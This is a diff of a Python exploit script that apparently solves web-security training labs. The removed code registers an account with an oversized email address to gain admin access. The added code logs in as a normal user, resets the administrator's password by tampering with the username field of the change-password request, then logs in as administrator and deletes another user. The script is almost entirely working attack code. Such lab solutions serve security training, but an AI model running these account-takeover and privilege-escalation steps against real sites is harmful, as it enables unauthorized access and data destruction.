@@ -34,48 +34,27 @@ def login_acc(s, url, path, username, password):
         "username": username,
         "password": password
     }
-    r = s.post(login_url, data=payload, headers=headers, proxies=proxies, verify=False)
+    r = s.post(login_url, data=payload, headers=headers)
     if 'Log out' in r.text:
         print(f'[+] Successful login {username} account')
     else:
         print(f'[-] Fail to login {username} account')
         sys.exit(-1)
 
-def register(s, url, path, username, email, password):
+def change_pass(s, url, path, csrf_path, username, new_password):
     target_url = url + path
     payload = {
-        'csrf': get_csrf_token(s, url, path),
+        'csrf': get_csrf_token(s, url, csrf_path),
         'username': username,
-        'email': email,
-        'password': password
+        'new-password-1': new_password,
+        'new-password-2': new_password
     }
     r = s.post(target_url, data=payload)
-    
-    if 'Please check your emails for your account registration link' in r.text and r.status_code == 200:
-        print('[+] Successful register')
-    else:
-        print('[-] Failed to register')
-        sys.exit(-1)
 
-def extract_link(text, search_string):
-    soup = BeautifulSoup(text, 'html.parser')
-    links = []
-    for link in soup.find_all('a'):
-        href = link.get('href') # type: ignore
-        if href and search_string in href:
-            links.append(href)
-    return links
-
-def verify(s, exploit_url, exploit_path, search_string):
-    target_url = exploit_url + exploit_path
-    r = s.get(target_url)
-    verify_link = extract_link(r.text, search_string)[0]
-    r = s.get(verify_link)
-    
-    if 'Account registration successful!' in r.text and r.status_code == 200:
-        print('[+] Successful verify register')
+    if 'Password changed successfully!' in r.text and r.status_code == 200:
+        print(f'[+] Successful changing {username}\'s password to \'{new_password}\'')
     else:
-        print('[-] Failed verify register')
+        print(f'[-] Failed to change password')
         sys.exit(-1)
 
 def delete_user(s, url, path, username):
@@ -95,26 +74,20 @@ def check_solved_lab(s, url):
         sys.exit(0)
 
 def main():
-    if len(sys.argv) != 3:
-        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
-        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
 
     s = requests.Session()
     url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
-    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]
 
-    chars = string.ascii_lowercase
-    random_str = ''.join(random.choices(chars, k=238))
-    username = ''.join(random.choices(chars, k=8))
-    email = random_str + f'@dontwannacry.com.{exploit_url.split('//')[1]}'
-    password = ''.join(random.choices(chars, k=8))
-    print(f'username={username}')
-    print(f'password={password}')
-    
-    register(s, url, '/register', username, email, password)
-    verify(s, exploit_url, '/email', '/register?temp-registration-token=')
-    login_acc(s, url, '/login', username, password)
+    target_user = 'administrator'
+    new_password = 'test'
+
+    login_acc(s, url, '/login', 'wiener', 'peter')
+    change_pass(s, url, '/my-account/change-password', '/my-account', target_user, new_password)
+    login_acc(s, url, '/login', target_user, new_password)
     delete_user(s, url, '/admin/delete', 'carlos')
     check_solved_lab(s, url)
 
